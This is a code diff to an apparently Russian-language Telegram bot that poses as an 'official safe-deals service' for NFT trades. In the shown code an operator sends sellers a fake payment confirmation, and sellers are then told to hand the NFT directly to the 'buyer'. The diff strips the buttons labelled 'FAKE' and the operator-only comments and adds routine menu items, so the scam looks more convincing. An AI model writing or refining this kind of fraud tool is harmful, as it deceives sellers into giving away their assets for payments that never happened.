@@ -26,14 +26,16 @@ class CreateDeal(StatesGroup):
 
 # --- МЕНЮ ---
 def user_menu():
-    # Обычные юзеры видят ТОЛЬКО эту кнопку
-    kb = [[KeyboardButton(text="🤝 Создать сделку")]]
+    kb = [
+        [KeyboardButton(text="🤝 Создать сделку")],
+        [KeyboardButton(text="📦 Мои сделки"), KeyboardButton(text="🆘 Поддержка")]
+    ]
     return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
 
 def admin_menu():
-    # Только ты видишь админ-панель
     kb = [
         [KeyboardButton(text="🤝 Создать сделку")],
+        [KeyboardButton(text="📦 Мои сделки"), KeyboardButton(text="🆘 Поддержка")],
         [KeyboardButton(text="🛡 Админ-панель")] 
     ]
     return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
@@ -45,6 +47,15 @@ async def cmd_start(message: Message):
         await message.answer("Добро пожаловать, Администратор 🛡\nВыберите действие:", reply_markup=admin_menu())
     else:
         await message.answer("Добро пожаловать 👋\nЭто официальный сервис безопасных сделок.\nВыберите действие:", reply_markup=user_menu())
+
+# --- ЗАГЛУШКИ ДЛЯ КНОПОК МЕНЮ ---
+@dp.message(F.text == "📦 Мои сделки")
+async def my_deals(message: Message):
+    await message.answer("📦 Раздел «Мои сделки»\n\nЗдесь будут отображаться ваши активные и завершенные сделки (в разработке).")
+
+@dp.message(F.text == "🆘 Поддержка")
+async def support(message: Message):
+    await message.answer("🆘 <b>Техническая поддержка</b>\n\nЕсли у вас возникли вопросы, напишите нашему менеджеру: @Твой_Юзернейм", parse_mode="HTML")
 
 # --- 1. СОЗДАНИЕ СДЕЛКИ ---
 @dp.message(F.text == "🤝 Создать сделку")
@@ -136,9 +147,9 @@ async def process_nft(message: Message, state: FSMContext):
         parse_mode="HTML"
     )
     
-    # ТОЛЬКО ТЕБЕ
+    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Подтвердить оплату (ФЕЙК)", callback_data=f"admin_confirm_{deal_id}")]
+        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
     ])
     
     await bot.send_message(
@@ -202,9 +213,9 @@ async def buyer_paid(call: CallbackQuery):
     deal["status"] = "awaiting_confirm"
     await call.message.edit_text("⏳ Ожидайте подтверждения оплаты администратором...")
     
-    # ТОЛЬКО ТЕБЕ
+    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Подтвердить оплату (ФЕЙК)", callback_data=f"admin_confirm_{deal_id}")]
+        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
     ])
     
     await bot.send_message(
@@ -220,7 +231,6 @@ async def buyer_paid(call: CallbackQuery):
 # --- 4. ТЫ (АДМИН) ПОДТВЕРЖДАЕШЬ ОПЛАТУ ---
 @dp.callback_query(F.data.startswith("admin_confirm_"))
 async def admin_confirm(call: CallbackQuery):
-    # Защита: если нажал не ты, просто игнорируем
     if call.from_user.id != ADMIN_ID:
         return await call.answer("⚠️ Сделка уже обрабатывается.", show_alert=False)
     
@@ -233,13 +243,12 @@ async def admin_confirm(call: CallbackQuery):
     deal["status"] = "paid"
     await call.message.edit_text(f"✅ Вы подтвердили оплату по сделке с @{deal['seller_name']}.")
     
+    # Текст БЕЗ "системы безопасных сделок" и без инструкций
     seller_text = (
-        f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК</b>\n\n"
         f"✅ <b>Оплата по сделке успешно подтверждена!</b>\n\n"
         f"📄 <b>Детали:</b>\n"
         f"├ Сумма: <b>{deal['amount']} RUB</b>\n"
         f"└ Товар: {deal['nft_link']}\n\n"
-        f"⚠️ <b>Инструкция для Продавца:</b>\n"
         f"Покупатель успешно перевел средства. <b>Передайте указанный NFT напрямую покупателю.</b>\n\n"
         f"<i>После передачи нажмите кнопку ниже.</i>"
     )
@@ -278,7 +287,7 @@ async def seller_done(call: CallbackQuery):
         parse_mode="HTML"
     )
     
-    # ТОЛЬКО ТЕБЕ
+    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить передачу NFT", callback_data=f"admin_confirm_nft_{deal_id}")]
     ])
@@ -298,7 +307,6 @@ async def seller_done(call: CallbackQuery):
 # --- 6. ТЫ (АДМИН) ПОДТВЕРЖДАЕШЬ ПЕРЕДАЧУ NFT ---
 @dp.callback_query(F.data.startswith("admin_confirm_nft_"))
 async def admin_confirm_nft(call: CallbackQuery):
-    # Защита
     if call.from_user.id != ADMIN_ID:
         return await call.answer("⚠️ Сделка уже обрабатывается.", show_alert=False)
     
